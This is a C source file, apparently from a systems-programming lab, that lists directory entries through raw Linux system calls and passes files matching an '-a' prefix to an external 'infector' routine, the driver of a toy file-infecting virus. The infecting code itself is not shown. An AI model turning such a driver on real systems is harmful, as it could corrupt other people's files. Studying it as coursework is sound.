#include "util.h"

#define SYS_CLOSE 6
#define SYS_OPEN 5
#define SYS_WRITE 4
#define SYS_READ 3
#define SYS_LSEEK 19
#define SYS_EXIT 1
#define SEEK_SET 0
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define ENOENT 2
#define O_CREATE 64
#define O_WRONLY 1
#define O_RDONLY 0
#define O_DIRECTORY 0x200000

extern int system_call();
extern int infector(char* filePath);

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                      /* length is actually (d_reclen - 2 -
                        offsetof(struct linux_dirent, d_name)) */
} linux_dirent;

int open_debug_system_call(int debugFlag, char* path, int flag, int permission)
{
  int fileNum = system_call(SYS_OPEN,path,flag,permission);
  if(debugFlag == 1){
    char * str;
    str = itoa(fileNum);
    system_call(SYS_WRITE,STDERR,path,strlen(path));
    system_call(SYS_WRITE,STDERR,"\n",1);
    system_call(SYS_WRITE,STDERR,"5 ",2);
    system_call(SYS_WRITE,STDERR,str,strlen(str));
    system_call(SYS_WRITE,STDERR,"\n",1);
  }
  return fileNum;
}

int write_debug_system_call(int debugFlag, int fileNum, char* buffer, int length)
{
  int bytesSent = system_call(SYS_WRITE, fileNum, buffer, length);
  if(debugFlag == 1){
    char * str;
    str = itoa(bytesSent);  
    system_call(SYS_WRITE,STDERR,"4 ",2);
    system_call(SYS_WRITE,STDERR,str,strlen(str));
    system_call(SYS_WRITE,STDERR,"\n",1);
  }
  return bytesSent;
}

int read_debug_system_call(int debugFlag, int fileNum, char* buffer, int length)
{
  int bytesRead = system_call(SYS_READ, fileNum, buffer, length);
  if(debugFlag == 1){
    char * str;
    str = itoa(bytesRead);
    system_call(SYS_WRITE,STDERR,"3 ",2);
    system_call(SYS_WRITE,STDERR,str,strlen(str));
    system_call(SYS_WRITE,STDERR,"\n",1);
  }
  return bytesRead;
}

int close_debug_system_call(int debugFlag, int fileNum)
{
  int returnedVal =   system_call(SYS_CLOSE,fileNum);
  if(debugFlag == 1){
    char * str;
    str = itoa(returnedVal);
    system_call(SYS_WRITE,STDERR,"6 ",2);
    system_call(SYS_WRITE,STDERR,str,strlen(str));
    system_call(SYS_WRITE,STDERR,"\n",1);
  }
  return fileNum;
} 

void write_file_debug_system_call(int debugFlag, linux_dirent* file)
{
  if(strncmp(file->d_name, "..",2) != 0 && strncmp(file->d_name, ".",1) != 0)
  { 
    write_debug_system_call(debugFlag,STDOUT,"name: ",6);
    write_debug_system_call(debugFlag,STDOUT,file->d_name,strlen(file->d_name));   
    write_debug_system_call(debugFlag,STDOUT,"\n",1);
    if (debugFlag == 1)
    {
      write_debug_system_call(debugFlag,STDOUT,"len: ",5);
      write_debug_system_call(debugFlag,STDOUT,itoa(file->d_reclen),strlen(itoa(file->d_reclen))); 
      write_debug_system_call(debugFlag,STDOUT,"\n",1);
    } 
  }
} 


int main (int argc , char* argv[], char* envp[])
{
  write_debug_system_call(0,STDOUT,"Flame 2 strikes!\n",17);  
  int i = 0;
  int debugFlag = 0;
  int prefixFlag = 0;
  int prefixArg = 0;
  int aPrefixFlag = 0;
  int aPrefixArg = 0;
  char buffer[8192];
  char* prefix;
  char* aPrefix;

  for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-D") == 0)
            debugFlag = 1;
        if (strncmp(argv[i], "-p",2) == 0) {
            prefixFlag = 1;
            prefixArg = i;
        }
        if (strncmp(argv[i], "-a",2) == 0) {
            aPrefixFlag = 1;
            aPrefixArg = i;
        }
  
  }
  if(prefixFlag == 1)
    prefix = argv[prefixArg]+2;
  if(aPrefixFlag == 1)
    aPrefix = argv[aPrefixArg]+2;

  int dirNum = open_debug_system_call(debugFlag,".",0,0);  
  if (dirNum < 0)
  {
    char* err = "Can't open Directory\n";
    write_debug_system_call(debugFlag,STDERR,err,strlen(err));
    system_call(SYS_EXIT,ENOENT);
  }

  i=-1;
  int nextDirent = 0;
  system_call(141,dirNum,buffer,8192); 
  
  while (i!=0)
  {
    linux_dirent* file = buffer+nextDirent;
    i = file->d_ino;
    if (i!=0){
      if (prefixFlag == 1){
        if (strncmp(file->d_name,prefix,strlen(prefix))==0){
          write_file_debug_system_call(debugFlag,file);
          write_debug_system_call(debugFlag,STDOUT,"type: ",6);
          write_debug_system_call(debugFlag,STDOUT,itoa(buffer[nextDirent + file->d_reclen -1]),1);   
          write_debug_system_call(debugFlag,STDOUT,"\n",1);
        }
      }
      else if (aPrefixFlag == 1){
        if (strncmp(file->d_name,aPrefix,strlen(aPrefix))==0){
          write_file_debug_system_call(debugFlag,file);
          write_debug_system_call(debugFlag,STDOUT,"type: ",6);
          write_debug_system_call(debugFlag,STDOUT,itoa(buffer[nextDirent + file->d_reclen -1]),1);   
          write_debug_system_call(debugFlag,STDOUT,"\n",1);
          infector(file->d_name);
        }
      }
      else {
        write_file_debug_system_call(debugFlag,file);
      }
      nextDirent = nextDirent + file->d_reclen; 
    }
  }
  return 0;
}